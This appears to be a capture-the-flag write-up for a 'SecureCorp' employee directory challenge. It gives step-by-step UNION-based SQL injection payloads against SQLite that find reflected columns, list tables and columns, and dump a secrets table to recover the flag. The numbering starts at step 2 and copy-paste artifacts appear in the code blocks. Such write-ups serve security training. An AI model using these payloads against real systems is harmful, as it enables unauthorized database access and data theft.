# Lite N Easy

## Challenge Description

You've discovered a simple employee directory for a company called "SecureCorp". The flag is stored somewhere on the server. Can you extract the flag?

<img width="972" height="535" alt="image" src="https://github.com/user-attachments/assets/6e50fc24-5fbe-4eaa-b025-18ff05fe3e11" />

<img width="1013" height="920" alt="image" src="https://github.com/user-attachments/assets/a536bc0a-dcd7-48da-85ed-86c5d2579435" />

### 2. **Test for Reflected Columns**

```sql
sql
CopyEdit
' UNION SELECT 1,2,3,4,5,6-- -

```

> Whichever number appears in the output is the reflected column — here it's column 1.
> 

---

### 📂 3. **List All Tables**

```sql
sql
CopyEdit
' UNION SELECT name,null,null,null,null,null FROM sqlite_master WHERE type='table'-- -

```

---

### 📋 4. **List Columns of `secrets`**

```sql
sql
CopyEdit
' UNION SELECT name,null,null,null,null,null FROM pragma_table_info('secrets')-- -

```

---

### 📋 5. **List Columns of `employees`**

```sql
sql
CopyEdit
' UNION SELECT name,null,null,null,null,null FROM pragma_table_info('employees')-- -

```

---

### 🔐 6. **Dump All Rows from `secrets`**

```sql
sql
CopyEdit
' UNION SELECT secret_name || ':' || secret_value,null,null,null,null,null FROM secrets-- -

```

This will pop the flag

<img width="1130" height="300" alt="image" src="https://github.com/user-attachments/assets/f8865086-bb47-4ad0-bfc3-6602925fb9b1" />
